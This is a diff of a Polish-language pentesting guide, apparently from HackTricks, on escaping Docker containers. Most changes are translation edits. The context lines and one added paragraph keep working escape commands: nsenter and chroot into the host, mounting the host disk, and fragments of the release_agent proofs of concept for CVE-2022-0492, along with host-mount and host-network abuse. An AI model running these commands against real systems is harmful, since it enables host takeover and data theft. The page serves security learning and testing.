@@ -12,7 +12,7 @@
 
 ## Ucieczka z zamontowanego gniazda Docker
 
-Jeśli w jakiś sposób odkryjesz, że **gniazdo docker jest zamontowane** wewnątrz kontenera docker, będziesz w stanie się z niego wydostać.\
+Jeśli w jakiś sposób odkryjesz, że **gniazdo docker jest zamontowane** wewnątrz kontenera docker, będziesz mógł się z niego wydostać.\
 Zwykle zdarza się to w kontenerach docker, które z jakiegoś powodu muszą łączyć się z demonem docker, aby wykonać działania.
 ```bash
 #Search the socket
@@ -33,13 +33,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-> [!NOTE]
-> W przypadku gdy **gniazdo docker jest w nieoczekiwanym miejscu**, nadal możesz się z nim komunikować, używając polecenia **`docker`** z parametrem **`-H unix:///path/to/docker.sock`**
+> [!TIP]
+> W przypadku, gdy **gniazdo dockera znajduje się w niespodziewanym miejscu**, nadal możesz się z nim komunikować, używając polecenia **`docker`** z parametrem **`-H unix:///path/to/docker.sock`**
 
-Demon Docker może również [nasłuchiwać na porcie (domyślnie 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lub w systemach opartych na Systemd, komunikacja z demonem Docker może odbywać się przez gniazdo Systemd `fd://`.
+Demon Dockera może również [nasłuchiwać na porcie (domyślnie 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) lub w systemach opartych na Systemd, komunikacja z demonem Dockera może odbywać się przez gniazdo Systemd `fd://`.
 
-> [!NOTE]
-> Dodatkowo zwróć uwagę na gniazda uruchomieniowe innych wysokopoziomowych środowisk:
+> [!TIP]
+> Dodatkowo, zwróć uwagę na gniazda uruchomieniowe innych wysokopoziomowych środowisk:
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
 > - containerd: `unix:///run/containerd/containerd.sock`
@@ -50,7 +50,7 @@ Demon Docker może również [nasłuchiwać na porcie (domyślnie 2375, 2376)](.
 
 ## Wykorzystanie uprawnień do ucieczki
 
-Powinieneś sprawdzić uprawnienia kontenera, jeśli ma któreś z następujących: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
+Powinieneś sprawdzić uprawnienia kontenera, jeśli ma któreś z następujących, możesz być w stanie się z niego wydostać: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 Możesz sprawdzić aktualne uprawnienia kontenera, używając **wcześniej wspomnianych automatycznych narzędzi** lub:
 ```bash
@@ -64,7 +64,7 @@ Na poniższej stronie możesz **dowiedzieć się więcej o możliwościach linux
 
 ## Ucieczka z uprzywilejowanych kontenerów
 
-Uprzywilejowany kontener może być utworzony z flagą `--privileged` lub poprzez wyłączenie konkretnych zabezpieczeń:
+Uprzywilejowany kontener może być stworzony z flagą `--privileged` lub poprzez wyłączenie konkretnych zabezpieczeń:
 
 - `--cap-add=ALL`
 - `--security-opt apparmor=unconfined`
@@ -92,7 +92,7 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privileged
 
-Tylko z flagą privileged możesz spróbować **uzyskać dostęp do dysku hosta** lub spróbować **uciec, nadużywając release_agent lub innych ucieczek**.
+Tylko z flagą privileged możesz spróbować **uzyskać dostęp do dysku hosta** lub spróbować **uciec, wykorzystując release_agent lub inne ucieczki**.
 
 Przetestuj następujące obejścia w kontenerze, wykonując:
 ```bash
@@ -134,7 +134,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### Ucieczka z uprawnieniami Wykorzystywanie istniejącego release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape Wykorzystanie istniejącego release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 ```bash:Initial PoC
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -168,7 +168,7 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Ucieczka z uprawnieniami Wykorzystanie stworzonego release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
+#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
 ```bash:Second PoC
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -216,9 +216,9 @@ Znajdź **wyjaśnienie techniki** w:
 docker-release_agent-cgroups-escape.md
 {{#endref}}
 
-#### Ucieczka z uprawnieniami wykorzystująca release_agent bez znajomości ścieżki względnej - PoC3
+#### Ucieczka z uprawnieniami wykorzystująca release_agent bez znajomości względnej ścieżki - PoC3
 
-W poprzednich exploitach **ujawniona jest absolutna ścieżka kontenera w systemie plików hosta**. Jednak nie zawsze tak jest. W przypadkach, gdy **nie znasz absolutnej ścieżki kontenera w hoście**, możesz użyć tej techniki:
+W poprzednich exploitach **ujawniona została absolutna ścieżka kontenera w systemie plików hosta**. Jednak nie zawsze tak jest. W przypadkach, gdy **nie znasz absolutnej ścieżki kontenera w hoście**, możesz użyć tej techniki:
 
 {{#ref}}
 release_agent-exploit-relative-paths-to-pids.md
@@ -312,7 +312,7 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### Ucieczka z uprawnieniami poprzez nadużywanie wrażliwych montażów
 
-Istnieje kilka plików, które mogą być zamontowane i które dają **informacje o podstawowym hoście**. Niektóre z nich mogą nawet wskazywać **coś, co ma być wykonane przez hosta, gdy coś się wydarzy** (co pozwoli atakującemu uciec z kontenera).\
+Istnieje kilka plików, które mogą być zamontowane i które dają **informacje o podstawowym hoście**. Niektóre z nich mogą nawet wskazywać **coś do wykonania przez hosta, gdy coś się wydarzy** (co pozwoli atakującemu uciec z kontenera).\
 Nadużycie tych plików może pozwolić na:
 
 - release_agent (już omówione wcześniej)
@@ -329,10 +329,12 @@ sensitive-mounts.md
 
 ### Dowolne montaże
 
-W wielu przypadkach zauważysz, że **kontener ma zamontowany jakiś wolumin z hosta**. Jeśli ten wolumin nie został poprawnie skonfigurowany, możesz być w stanie **uzyskać dostęp/modyfikować wrażliwe dane**: Czytać sekrety, zmieniać ssh authorized_keys…
+W wielu przypadkach odkryjesz, że **kontener ma zamontowany jakiś wolumin z hosta**. Jeśli ten wolumin nie został poprawnie skonfigurowany, możesz być w stanie **uzyskać dostęp/modyfikować wrażliwe dane**: Czytać sekrety, zmieniać ssh authorized_keys…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
+Inny interesujący przykład można znaleźć w [**tym blogu**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce), gdzie wskazano, że foldery `/usr/bin/` i `/bin/` hosta są zamontowane wewnątrz kontenera, co pozwala użytkownikowi root kontenera na modyfikację binarnych plików w tych folderach. Dlatego, jeśli zadanie cron korzysta z jakiegokolwiek binarnego pliku stamtąd, jak `/etc/cron.d/popularity-contest`, umożliwia to ucieczkę z kontenera poprzez modyfikację binarnego pliku używanego przez zadanie cron.
+
 ### Eskalacja uprawnień z 2 powłokami i montowaniem hosta
 
 Jeśli masz dostęp jako **root wewnątrz kontenera**, który ma zamontowany jakiś folder z hosta i udało ci się **uciec jako użytkownik bez uprawnień do hosta** oraz masz dostęp do odczytu zamontowanego folderu.\
@@ -423,7 +425,7 @@ Możesz również **zabić procesy i spowodować DoS**.
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
-Jeśli kontener został skonfigurowany z użyciem Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), stos sieciowy tego kontenera nie jest izolowany od hosta Docker (kontener dzieli przestrzeń nazw sieci hosta) i kontener nie otrzymuje przydzielonego własnego adresu IP. Innymi słowy, **kontener wiąże wszystkie usługi bezpośrednio z adresem IP hosta**. Ponadto kontener może **przechwytywać WSZYSTKI ruch sieciowy, który host** wysyła i odbiera na współdzielonym interfejsie `tcpdump -i eth0`.
+Jeśli kontener został skonfigurowany z użyciem Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), stos sieciowy tego kontenera nie jest izolowany od hosta Docker (kontener dzieli przestrzeń nazw sieciową hosta), a kontener nie otrzymuje przydzielonego własnego adresu IP. Innymi słowy, **kontener wiąże wszystkie usługi bezpośrednio z adresem IP hosta**. Ponadto kontener może **przechwytywać WSZYSTKI ruch sieciowy, który host** wysyła i odbiera na współdzielonym interfejsie `tcpdump -i eth0`.
 
 Na przykład, możesz to wykorzystać do **podsłuchiwania, a nawet fałszowania ruchu** między hostem a instancją metadanych.
 
@@ -432,7 +434,7 @@ Jak w poniższych przykładach:
 - [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
 - [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)
 
-Będziesz również w stanie uzyskać dostęp do **usług sieciowych powiązanych z localhost** wewnątrz hosta lub nawet uzyskać dostęp do **uprawnień metadanych węzła** (które mogą różnić się od tych, do których kontener ma dostęp).
+Będziesz mógł również uzyskać dostęp do **usług sieciowych powiązanych z localhost** wewnątrz hosta lub nawet uzyskać dostęp do **uprawnień metadanych węzła** (które mogą różnić się od tych, do których kontener ma dostęp).
 
 ### hostIPC
 ```bash
@@ -453,7 +455,7 @@ cat /proc/self/status | grep CapEff
 ```
 ### Nadużycie przestrzeni nazw użytkownika za pomocą symlink
 
-Druga technika opisana w poście [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) wskazuje, jak można nadużyć montowania powiązań z przestrzeniami nazw użytkownika, aby wpłynąć na pliki wewnątrz hosta (w tym konkretnym przypadku, usunąć pliki).
+Druga technika opisana w poście [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) wskazuje, jak można nadużywać montażu wiązanego z przestrzeniami nazw użytkownika, aby wpływać na pliki wewnątrz hosta (w tym konkretnym przypadku, usuwać pliki).
 
 ## CVE
 
@@ -470,7 +472,7 @@ To uruchomi ładunek, który jest obecny w pliku main.go.
 
 Aby uzyskać więcej informacji: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-> [!NOTE]
+> [!TIP]
 > Istnieją inne CVE, na które kontener może być podatny, możesz znaleźć listę w [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 
 ## Niestandardowe ucieczki Docker
